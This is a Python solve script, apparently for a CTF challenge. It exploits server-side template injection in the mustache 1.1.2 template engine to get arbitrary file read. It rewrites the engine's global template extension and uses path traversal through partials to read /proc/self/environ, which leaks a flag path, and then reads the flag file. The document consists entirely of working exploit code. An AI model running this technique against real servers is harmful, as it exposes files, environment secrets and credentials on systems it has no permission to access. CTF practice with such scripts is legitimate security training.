#!/usr/bin/env python3
# solve.py — Tempaude: mustache 1.1.2 SSTI -> arbitrary file read.
# usage: solve.py <host> <port>
import sys, re, html, urllib.parse, http.client

HOST, PORT = sys.argv[1], int(sys.argv[2])

def render(template):
    body = urllib.parse.urlencode({"engine": "mustache", "template": template})
    c = http.client.HTTPConnection(HOST, PORT, timeout=10)
    c.request("POST", "/", body, {"Content-Type": "application/x-www-form-urlencoded"})
    h = c.getresponse().read().decode("utf-8", "replace"); c.close()
    m = re.search(r'renderedOutput">(.*?)</pre>', h, re.S)
    return html.unescape(m.group(1)) if m else ""

def set_ext(ext):          # rewrite the mutable global extension in place
    return "{{#template_extension.replace}}%s{{/template_extension.replace}}" % ext

def read_file(abspath):
    # name must end in '/', ext must start with '/', so the forced '.' becomes './'
    d, base = abspath.rsplit("/", 1)
    name = "../../../../../../.." + d + "/"     # climb to /, descend to dir, trailing '/'
    ext  = "/" + base
    tpl  = set_ext(ext) + "R>>>" + "{{#partial}}%s{{/partial}}" % name + "<<<" + set_ext("mustache")
    m = re.search(r"R>>>(.*?)<<<", render(tpl), re.S)
    return m.group(1) if m else ""

# 0) confirm SSTI
print("[*] SSTI:", render("{{class}} {{class.superclass.included_modules.last}}").strip())
# 1) leak FLAG_PATH from /proc/self/environ
environ = read_file("/proc/self/environ")
fp = re.search(r"FLAG_PATH=([^\x00]+)", environ)
flag_path = fp.group(1) if fp else None
print("[*] FLAG_PATH:", flag_path)
# 2) read the flag file
if flag_path:
    data = read_file(flag_path)
    m = re.search(r"csaw\{[^}]*\}", data)
    print("[+] FLAG:", m.group() if m else data.strip())
